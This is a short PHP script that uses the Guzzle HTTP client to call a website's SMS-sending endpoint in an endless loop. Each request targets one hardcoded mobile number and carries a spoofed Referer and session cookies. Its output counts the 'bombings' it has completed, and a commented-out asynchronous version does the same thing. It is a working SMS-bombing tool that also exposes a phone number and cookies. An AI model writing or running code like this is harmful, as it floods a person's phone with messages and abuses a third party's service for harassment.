<?php
/**
 * Created by PhpStorm.
 * User: Hanson
 * Date: 2016/5/30
 * Time: 22:46
 */

require __DIR__ . './../vendor/autoload.php';
$client = new \GuzzleHttp\Client();

//$requests = function ($total) use ($client) {
//    while(1){
//
//        $uri = 'http://happyweixin.cn/index/sendmsg.html?mob=15151913696';
//        yield function () use ($client, $uri) {
//            return $client->getAsync($uri, [
//                'headers' => [
//                    'Referer' => 'http://happyweixin.cn/?k2=1d295f05768bf8be80a4d742a56e39c6&t=1464624827&k=qw1len0i_47&r=1464624830682',
//                    'Cookie' => 'PHPSESSID=425i6tulmb5hs2t4r7un70p0a1; ylHQJskdG=Vqg9EIKtjuDQYSsz7k; ysl9pqIidRarhk=q0kfpCxwz7; lGieJYLxkbTy3=q48uYrHnTSZ'
//                ]
//            ]);
//        };
//    }
//};
//
$i = 0;
//$pool = new \GuzzleHttp\Pool($client, $requests(10), [
//    'fulfilled' => function ($response, $index) {
//
//        $res = json_decode($response->getBody()->getContents());
//
//        print_r($res);
//    },
//]);
//$promise = $pool->promise();
//$promise->wait();
while (1) {
    $response = $client->request('get', 'http://happyweixin.cn/index/sendmsg.html?mob=15151913696', [
        'headers' => [
            'Referer' => 'http://happyweixin.cn/?k2=1d295f05768bf8be80a4d742a56e39c6&t=1464624827&k=qw1len0i_47&r=1464624830682',
            'Cookie' => 'PHPSESSID=425i6tulmb5hs2t4r7un70p0a1; ylHQJskdG=Vqg9EIKtjuDQYSsz7k; ysl9pqIidRarhk=q0kfpCxwz7; lGieJYLxkbTy3=q48uYrHnTSZ'
        ],
    ]);
    if ($response->getBody()->getContents() == 'ok')
        echo '已经轰炸' . ++$i . '次' . PHP_EOL;

}
